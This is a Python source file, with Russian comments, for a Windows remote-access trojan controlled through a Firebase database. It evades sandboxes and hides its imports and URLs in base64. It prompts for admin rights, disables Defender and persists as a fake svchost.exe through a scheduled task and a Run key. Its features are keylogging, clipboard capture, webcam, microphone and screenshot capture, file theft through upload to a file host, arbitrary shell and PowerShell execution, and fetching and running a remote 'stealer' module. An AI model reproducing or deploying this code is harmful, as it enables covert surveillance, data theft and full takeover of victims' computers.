#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, os, time, base64, json, subprocess, ctypes, threading, webbrowser, random, io, shutil, winreg, traceback, urllib.request
from datetime import datetime

# ---- ЗАДЕРЖКА 30 СЕКУНД ----
time.sleep(30)

# ---- ПРОВЕРКА НА ВИРТУАЛКУ ----
def _sandbox():
    try:
        import psutil
        if psutil.virtual_memory().total < 2 * 1024**3:
            sys.exit(0)
    except: pass
    try:
        out = subprocess.check_output('wmic bios get manufacturer', shell=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if any(x in out.lower() for x in ['vmware', 'virtualbox', 'vbox']):
            sys.exit(0)
    except: pass
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit(0)
_sandbox()

# ---- ДЕКОДЕР BASE64 ----
def _d(s):
    return base64.b64decode(s).decode()

# ---- ИМПОРТЫ (безопасные) ----
_requests   = __import__(_d('cmVxdWVzdHM='))
_pyrebase   = __import__(_d('cHlyZWJhc2U='))
_pyautogui  = __import__(_d('cHlhdXRvZ3Vp'))
_pystray    = __import__(_d('cHlzdHJheQ=='))
_PIL_Image  = __import__(_d('UElMLkltYWdl'))
_PIL_Draw   = __import__(_d('UElMLkltYWdlRHJhdw=='))
_PIL_Font   = __import__(_d('UElMLkltYWdlRm9udA=='))
_pynput_kb  = __import__(_d('cHlucHV0LmtleWJvYXJk'))
_pynput_mouse = __import__(_d('cHlucHV0Lm1vdXNl'))
_pyttsx3    = __import__(_d('cHl0dHN4Mw=='))

# ---- КОНФИГ FIREBASE ----
_FB = _d('eyJhcGlLZXkiOiJBSXphU3lBQWIyZF9JT0NwRE9fbmlxZmtqZldkZGhwWm8weWFET00iLCJhdXRoRG9tYWluIjoiZ2VuLWxhbmctY2xpZW50LTA4ODQ3OTIxMDMuZmlyZWJhc2VhcHAuY29tIiwiZGF0YWJhc2VVUkwiOiJodHRwczovL2dlbi1sYW5nLWNsaWVudC0wODg0NzkyMTAzLWRlZmF1bHQtcnRkYi5ldXJvcGUtd2VzdDEuZmlyZWJhc2VkYXRhYmFzZS5hcHAiLCJwcm9qZWN0SWQiOiJnZW4tbGFuZy1jbGllbnQtMDg4NDc5MjEwMyIsInN0b3JhZ2VCdWNrZXQiOiJnZW4tbGFuZy1jbGllbnQtMDg4NDc5MjEwMy5maXJlYmFzZXN0b3JhZ2UuYXBwIiwibWVzc2FnaW5nU2VuZGVySWQiOiI1NTYwNTcyMTA3NTYiLCJhcHBJZCI6IjE6NTU2MDU3MjEwNzU2OndlYjo0NTY3N2Q2ZTI4MDY2YmU4MTFmN2QxIn0=')
_FIREBASE_CONFIG = json.loads(_FB)
_VIKING_HASH = _d('bnVTaGdWVzM4bQ==')
_USER = os.getlogin()
_USER_ID = _USER.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_")
_CLIENT_PATH = f"clients/{_USER_ID}"

# ---- ЗАГРУЗКА НА VIKINGFILE ----
def _upload_single(file_path):
    try:
        resp = _requests.get(_d('aHR0cHM6Ly92aWtpbmdmaWxlLmNvbS9hcGkvZ2V0LXNlcnZlcg=='), timeout=10)
        if resp.status_code != 200: return None
        file_size = os.path.getsize(file_path)
        resp = _requests.post(_d('aHR0cHM6Ly92aWtpbmdmaWxlLmNvbS9hcGkvZ2V0LXVwbG9hZC11cmw='), data={'size': file_size}, timeout=10)
        if resp.status_code != 200: return None
        data = resp.json()
        upload_id = data['uploadId']; key = data['key']; part_size = data['partSize']; urls = data['urls']
        parts = []
        with open(file_path, 'rb') as f:
            for i, url in enumerate(urls):
                chunk = f.read(part_size)
                if not chunk: break
                pr = _requests.put(url, data=chunk, headers={'Content-Type': 'application/octet-stream'}, timeout=300)
                if pr.status_code != 200: raise Exception('Part fail')
                etag = pr.headers.get('ETag', '').strip('"')
                if not etag: raise Exception('No ETag')
                parts.append({'PartNumber': i+1, 'ETag': etag})
        complete_data = {'key': key, 'uploadId': upload_id, 'name': os.path.basename(file_path), 'user': _VIKING_HASH}
        for i, p in enumerate(parts):
            complete_data[f'parts[{i}][PartNumber]'] = p['PartNumber']
            complete_data[f'parts[{i}][ETag]'] = p['ETag']
        resp = _requests.post(_d('aHR0cHM6Ly92aWtpbmdmaWxlLmNvbS9hcGkvY29tcGxldGUtdXBsb2Fk'), data=complete_data, timeout=30)
        if resp.status_code == 200:
            return resp.json().get('url')
    except: pass
    return None

# ---- ПОВЫШЕНИЕ ПРИВИЛЕГИЙ (UAC) ----
def _elevate():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    try:
        exe = sys.executable if getattr(sys, 'frozen', False) else sys.executable
        args = ' '.join(sys.argv[1:]) if len(sys.argv) > 1 else ''
        ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, args, None, 1)
        return False
    except:
        return False

# ---- ОТКЛЮЧЕНИЕ DEFENDER (безопасное) ----
def _disable_defender():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return 'not_admin'
        exe = sys.executable if getattr(sys, 'frozen', False) else sys.executable
        subprocess.run(f'powershell -Command "Set-MpPreference -ExclusionPath \\"{exe}\\""', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
        return 'disabled'
    except Exception as e:
        return f'error: {e}'

# ---- КОМАНДЫ (без паролей и Defender) ----
def _a():  # rickroll
    webbrowser.open(_d('aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hDUQ=='))

def _b(p):
    _pyautogui.alert(text=p or 'Сообщение', title='Управление')

def _c(d=10):
    _pyautogui.FAILSAFE = False
    end = time.time()+d
    while time.time()<end:
        _pyautogui.moveRel(random.randint(-200,200), random.randint(-200,200), duration=0.1)
        time.sleep(0.05)
    _pyautogui.FAILSAFE = True

def _d_screenshot(db):
    try:
        img = _pyautogui.screenshot()
        buf = io.BytesIO()
        img.convert('RGB').save(buf, format='JPEG', quality=50)
        db.child(_CLIENT_PATH).update({'screenshot': base64.b64encode(buf.getvalue()).decode()})
    except Exception as e:
        db.child(_CLIENT_PATH).update({'screenshot_error': str(e)})

def _e(url):
    try:
        with urllib.request.urlopen(url) as resp:
            data = resp.read()
        ext = os.path.splitext(url)[1] or '.jpg'
        tmp = os.path.join(tempfile.gettempdir(), f'wp_{_USER_ID}{ext}')
        with open(tmp, 'wb') as f: f.write(data)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp, 3)
    except: pass

def _f(t):
    try:
        engine = _pyttsx3.init()
        engine.say(t or 'Привет')
        engine.runAndWait()
    except: pass

def _g():
    for _ in range(10): subprocess.Popen('calc.exe', shell=True)

def _h():
    ctypes.windll.user32.SwapMouseButton(1)
    time.sleep(30)
    ctypes.windll.user32.SwapMouseButton(0)

def _i(db, daemon):
    daemon._disable_startup()
    copy_path = os.path.expandvars(_d('JUFwcERhdGElXE1pY3Jvc29mdFxXaW5kb3dzXENhY2hlc1xzdmNob3N0LmV4ZQ=='))
    if os.path.exists(copy_path):
        try: os.remove(copy_path)
        except: pass
    if getattr(sys, 'frozen', False):
        bat = f'@echo off\nping 127.0.0.1 -n 3 >nul\ndel /f /q "{sys.executable}"\ndel /f /q "%~f0"'
        batp = os.path.join(tempfile.gettempdir(), 'sd.bat')
        with open(batp, 'w') as f: f.write(bat)
        subprocess.Popen(batp, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    try: db.child(_CLIENT_PATH).update({'status': 'offline'})
    except: pass
    os._exit(0)

def _j(cmd, db):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = proc.communicate(timeout=30)
        db.child(_CLIENT_PATH).update({'last_cmd_output': (out+err)[:5000]})
    except Exception as e:
        db.child(_CLIENT_PATH).update({'last_cmd_output': f'ERROR: {str(e)}'})

def _k(dur, daemon):
    dur = float(dur) if dur else 10
    if daemon._disco_active: return
    daemon._disco_active = True
    def disco():
        end = time.time()+dur
        while time.time()<end and daemon._disco_active:
            _pyautogui.press('volumeup'); time.sleep(0.1)
            _pyautogui.press('volumedown'); time.sleep(0.1)
        daemon._disco_active = False
    threading.Thread(target=disco, daemon=True).start()

# ---- ФАЙЛОВЫЙ МЕНЕДЖЕР ----
def _l(db, payload):
    try:
        p = json.loads(payload)
        action = p.get('action')
        path = p.get('path', '')
        if action == 'list':
            if not os.path.isdir(path):
                db.child(_CLIENT_PATH).update({'file_list_error': 'Not a directory'})
                return
            items = []
            for entry in os.scandir(path):
                try:
                    st = entry.stat()
                    items.append({'name': entry.name, 'is_dir': entry.is_dir(), 'size': st.st_size if not entry.is_dir() else 0, 'mtime': st.st_mtime})
                except: pass
            items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
            db.child(_CLIENT_PATH).update({'file_list': items[:500]})
        elif action == 'download':
            if os.path.isfile(path):
                url = _upload_single(path)
                if url:
                    db.child(_CLIENT_PATH).update({'downloaded_file_url': url, 'downloaded_file_name': os.path.basename(path)})
            else:
                db.child(_CLIENT_PATH).update({'file_download_error': 'File not found'})
        elif action == 'delete':
            if os.path.exists(path):
                if os.path.isfile(path): os.remove(path)
                else: shutil.rmtree(path)
                db.child(_CLIENT_PATH).update({'file_deleted': path})
            else:
                db.child(_CLIENT_PATH).update({'file_delete_error': 'Not found'})
        else:
            db.child(_CLIENT_PATH).update({'file_manager_error': 'Unknown action'})
    except Exception as e:
        db.child(_CLIENT_PATH).update({'file_manager_error': str(e)})

# ---- МИКРОФОН ----
def _n(db, duration=10):
    try:
        import sounddevice as sd
        import scipy.io.wavfile as wav
        dur = float(duration) if duration else 10
        fs = 44100
        recording = sd.rec(int(dur * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        temp_wav = os.path.join(tempfile.gettempdir(), f'mic_{_USER_ID}.wav')
        wav.write(temp_wav, fs, recording)
        url = _upload_single(temp_wav)
        if url:
            db.child(_CLIENT_PATH).update({'mic_url': url, 'mic_duration': dur})
        os.remove(temp_wav)
    except Exception as e:
        db.child(_CLIENT_PATH).update({'mic_error': str(e)})

# ---- ВЕБ-КАМЕРА ----
def _o(db):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            db.child(_CLIENT_PATH).update({'webcam_error': 'Cannot open camera'})
            return
        ret, frame = cap.read()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            b64 = base64.b64encode(buf).decode()
            db.child(_CLIENT_PATH).update({'webcam_image': b64})
        else:
            db.child(_CLIENT_PATH).update({'webcam_error': 'No frame'})
        cap.release()
    except Exception as e:
        db.child(_CLIENT_PATH).update({'webcam_error': str(e)})

# ---- POWERSHELL ----
def _p(db, script):
    try:
        temp_ps1 = os.path.join(tempfile.gettempdir(), f'ps_{_USER_ID}.ps1')
        with open(temp_ps1, 'w', encoding='utf-8') as f:
            f.write(script)
        cmd = f'powershell -ExecutionPolicy Bypass -File "{temp_ps1}"'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = proc.communicate(timeout=60)
        db.child(_CLIENT_PATH).update({'ps_output': out[:5000], 'ps_error': err[:5000]})
        os.remove(temp_ps1)
    except Exception as e:
        db.child(_CLIENT_PATH).update({'ps_error': str(e)})

# ---- КЕЙЛОГГЕР ----
class _KeyLogger:
    def __init__(self, db):
        self.db = db
        self.buffer = []
        self.lock = threading.Lock()
        self.running = False
        self.listener = None

    def start(self):
        if self.running: return
        self.running = True
        self.listener = _pynput_kb.Listener(on_press=self._on_press)
        self.listener.start()
        threading.Thread(target=self._loop, daemon=True).start()

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None
        self._flush()

    def _on_press(self, key):
        if not self.running: return
        try:
            if hasattr(key, 'char') and key.char is not None:
                ch = key.char
            else:
                ch = f'[{key.name}]' if hasattr(key, 'name') else f'[{str(key)}]'
            with self.lock:
                self.buffer.append(ch)
                if len(self.buffer) >= 1000:
                    self._flush()
        except: pass

    def _flush(self):
        with self.lock:
            if not self.buffer: return
            text = ''.join(self.buffer)
            self.buffer.clear()
        try:
            current = self.db.child(_CLIENT_PATH).child('keylog').get().val() or ''
            if len(current) > 5000: current = current[-5000:]
            self.db.child(_CLIENT_PATH).update({'keylog': (current + text)[-10000:]})
        except: pass

    def _loop(self):
        while self.running:
            time.sleep(30)
            self._flush()

# ---- МОНИТОРИНГ БУФЕРА ОБМЕНА ----
def _clip_monitor(db):
    try:
        import pyperclip
        last = ''
        while True:
            try:
                txt = pyperclip.paste()
                if txt and txt != last:
                    db.child(_CLIENT_PATH).child('clipboard_history').push({
                        'text': txt[:500],
                        'timestamp': {'.sv': 'timestamp'}
                    })
                    last = txt
            except: pass
            time.sleep(2)
    except: pass

# ---- ГЕОЛОКАЦИЯ ----
def _geo():
    try:
        resp = _requests.get(_d('aHR0cDovL2lwLWFwaS5jb20vanNvbi8='), timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                return {'ip': data.get('query'), 'country': data.get('country'), 'city': data.get('city'), 'isp': data.get('isp'), 'lat': data.get('lat'), 'lon': data.get('lon')}
    except: pass
    return None

# ---- ПЕРСИСТЕНС ----
def _create_persist():
    try:
        appdata = os.path.expandvars(_d('JUFwcERhdGElXE1pY3Jvc29mdFxXaW5kb3dzXENhY2hlcw=='))
        if not os.path.exists(appdata): os.makedirs(appdata)
        ctypes.windll.kernel32.SetFileAttributesW(appdata, 2)
        exe = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
        copy_path = os.path.join(appdata, 'svchost.exe')
        if getattr(sys, 'frozen', False):
            shutil.copy2(sys.executable, copy_path)
        else:
            shutil.copy2(os.path.abspath(__file__), copy_path + '.py')
        task = 'RemoteControlTask'
        subprocess.run(f'schtasks /delete /tn "{task}" /f', shell=True, capture_output=True)
        subprocess.run(f'schtasks /create /tn "{task}" /tr "{copy_path}" /sc minute /mo 5 /f', shell=True, capture_output=True)
        return True
    except: return False

def _remove_persist():
    try:
        subprocess.run('schtasks /delete /tn "RemoteControlTask" /f', shell=True, capture_output=True)
        appdata = os.path.expandvars(_d('JUFwcERhdGElXE1pY3Jvc29mdFxXaW5kb3dzXENhY2hlcw=='))
        copy_path = os.path.join(appdata, 'svchost.exe')
        if os.path.exists(copy_path): os.remove(copy_path)
        py_copy = copy_path + '.py'
        if os.path.exists(py_copy): os.remove(py_copy)
        try: os.rmdir(appdata)
        except: pass
        return True
    except: return False

# ---- ОСНОВНОЙ КЛАСС ----
class _Daemon:
    def __init__(self):
        self._stop = threading.Event()
        self._db = None
        self._tray = None
        self._connected = False
        self._block = False
        self._ml = None
        self._kl = None
        self._disco_active = False
        self._keylog = None
        self._clip_thread = None

    def _init_fb(self):
        try:
            fb = _pyrebase.initialize_app(_FIREBASE_CONFIG)
            self._db = fb.database()
            self._db.child('clients').get()
            self._connected = True
        except Exception as e:
            print(f'FB init error: {e}')

    def _heartbeat(self):
        while not self._stop.is_set():
            try:
                if self._db:
                    self._db.child(_CLIENT_PATH).update({'last_seen': {'.sv': 'timestamp'}})
            except: pass
            time.sleep(5)

    def _poll(self):
        last = 'none'
        while not self._stop.is_set():
            try:
                if not self._db:
                    time.sleep(2); continue
                data = self._db.child(_CLIENT_PATH).get().val()
                if isinstance(data, dict):
                    cmd = data.get('command', 'none')
                    payload = data.get('payload', '')
                    if cmd != 'none' and cmd != last:
                        threading.Thread(target=self._exec, args=(cmd, payload), daemon=True).start()
                        self._db.child(_CLIENT_PATH).update({'command': 'none'})
                    last = cmd
            except: pass
            time.sleep(2)

    def _exec(self, cmd, payload):
        try:
            if cmd == 'rickroll': _a()
            elif cmd == 'msg': _b(payload)
            elif cmd == 'crazy_mouse': _c()
            elif cmd == 'block_input':
                en = payload.lower() == 'true'
                if en and not self._block:
                    self._block = True; self._block_start()
                elif not en and self._block:
                    self._block = False; self._block_stop()
            elif cmd == 'screenshot': _d_screenshot(self._db)
            elif cmd == 'wallpaper': _e(payload)
            elif cmd == 'tts': _f(payload)
            elif cmd == 'open_calc': _g()
            elif cmd == 'swap_mouse': _h()
            elif cmd == 'self_destruct': _i(self._db, self)
            elif cmd == 'cmd_execute': _j(payload, self._db)
            elif cmd == 'disco': _k(payload, self)
            elif cmd == 'file_manager': _l(self._db, payload)
            elif cmd == 'record_mic': _n(self._db, payload)
            elif cmd == 'webcam_snapshot': _o(self._db)
            elif cmd == 'powershell_execute': _p(self._db, payload)
            elif cmd == 'create_persistence': _create_persist()
            elif cmd == 'remove_persistence': _remove_persist()
            elif cmd == 'load_stealer':
                self._load_stealer_module()
        except Exception as e:
            try: self._db.child(_CLIENT_PATH).update({'last_error': str(e)[:1000]})
            except: pass

    def _load_stealer_module(self):
        try:
            url = _d('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tuZW8tV29ybGQvcHJpY29sbmFkZHJ1ZzEuNi9tYWluL3N0ZWFsZXIucHk=')
            resp = _requests.get(url, timeout=15)
            if resp.status_code == 200:
                code = resp.text
                exec_globals = {
                    'db': self._db,
                    '_CLIENT_PATH': _CLIENT_PATH,
                    '_USER_ID': _USER_ID,
                    '_upload_single': _upload_single,
                    '_disable_defender': _disable_defender
                }
                exec(code, exec_globals)
                self._db.child(_CLIENT_PATH).update({'stealer_status': 'loaded'})
            else:
                self._db.child(_CLIENT_PATH).update({'stealer_error': f'HTTP {resp.status_code}'})
        except Exception as e:
            self._db.child(_CLIENT_PATH).update({'stealer_error': str(e)})

    def _block_start(self):
        def sup(*a): return False
        self._ml = _pynput_mouse.Listener(suppress=True, on_move=sup, on_click=sup, on_scroll=sup)
        self._kl = _pynput_kb.Listener(suppress=True, on_press=sup, on_release=sup)
        self._ml.start(); self._kl.start()

    def _block_stop(self):
        if self._ml: self._ml.stop(); self._ml = None
        if self._kl: self._kl.stop(); self._kl = None

    def _disable_startup(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _d('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu'), 0, winreg.KEY_SET_VALUE)
            try: winreg.DeleteValue(key, 'RemoteControl')
            except: pass
            winreg.CloseKey(key)
        except: pass
        _remove_persist()
        if self._tray:
            self._tray.notify('Автозагрузка отключена', 'Remote Control')

    def _tray_icon(self):
        try:
            size = 64
            img = _PIL_Image.new('RGBA', (size, size), (0,0,0,0))
            dc = _PIL_Draw.Draw(img)
            dc.ellipse((4,4,size-4,size-4), fill=(0,120,255,255))
            try: font = _PIL_Font.truetype('arial.ttf', 30)
            except: font = _PIL_Font.load_default()
            dc.text((18,14), 'R', fill=(255,255,255,255), font=font)
            menu = _pystray.Menu(
                _pystray.MenuItem(lambda item: f'ID: {_USER_ID}', None, enabled=False),
                _pystray.MenuItem(lambda item: 'Online' if self._connected else 'Offline', None, enabled=False),
                _pystray.MenuItem('Переподключиться', lambda icon: self._init_fb()),
                _pystray.MenuItem('Отключить автозапуск', lambda icon: self._disable_startup()),
                _pystray.MenuItem('Выход', lambda icon: self._shutdown())
            )
            self._tray = _pystray.Icon('RemoteControl', img, 'System', menu)
            self._tray.run()
        except Exception as e:
            print(f'Tray error: {e}')

    def _shutdown(self):
        self._stop.set()
        if self._block: self._block_stop()
        if self._keylog: self._keylog.stop()
        try:
            if self._db: self._db.child(_CLIENT_PATH).update({'status': 'offline'})
        except: pass
        if self._tray: self._tray.stop()
        sys.exit(0)

    def run(self):
        # ---- ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ----
        if not ctypes.windll.shell32.IsUserAnAdmin():
            exe = sys.executable if getattr(sys, 'frozen', False) else sys.executable
            args = ' '.join(sys.argv[1:]) if len(sys.argv) > 1 else ''
            ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, args, None, 1)
            return  # текущий процесс завершится

        # ---- ТЕПЕРЬ МЫ АДМИН ----
        def_status = _disable_defender()
        # --- ИНИЦИАЛИЗАЦИЯ FIREBASE ---
        self._init_fb()
        try:
            self._db.child(_CLIENT_PATH).set({
                'status': 'online',
                'last_seen': {'.sv': 'timestamp'},
                'command': 'none',
                'payload': '',
                'screenshot': '',
                'last_cmd_output': '',
                'defender_status': def_status
            })
        except Exception as e:
            print(f'Reg error: {e}')

        # Автозагрузка
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _d('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu'), 0, winreg.KEY_SET_VALUE)
            exe = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
            winreg.SetValueEx(key, 'RemoteControl', 0, winreg.REG_SZ, exe)
            winreg.CloseKey(key)
        except: pass
        _create_persist()

        geo = _geo()
        if geo:
            try: self._db.child(_CLIENT_PATH).update({'geo': geo})
            except: pass

        self._keylog = _KeyLogger(self._db)
        self._keylog.start()

        try:
            import pyperclip
            self._clip_thread = threading.Thread(target=_clip_monitor, args=(self._db,), daemon=True)
            self._clip_thread.start()
        except: pass

        threading.Thread(target=self._heartbeat, daemon=True).start()
        threading.Thread(target=self._poll, daemon=True).start()
        threading.Thread(target=self._tray_icon, daemon=True).start()

        self._stop.wait()

if __name__ == '__main__':
    try:
        _Daemon().run()
    except Exception as e:
        try:
            fb = _pyrebase.initialize_app(_FIREBASE_CONFIG)
            db = fb.database()
            db.child(_CLIENT_PATH).update({'fatal_error': traceback.format_exc()[:1000]})
        except: pass
        traceback.print_exc()
        input('Press Enter...')
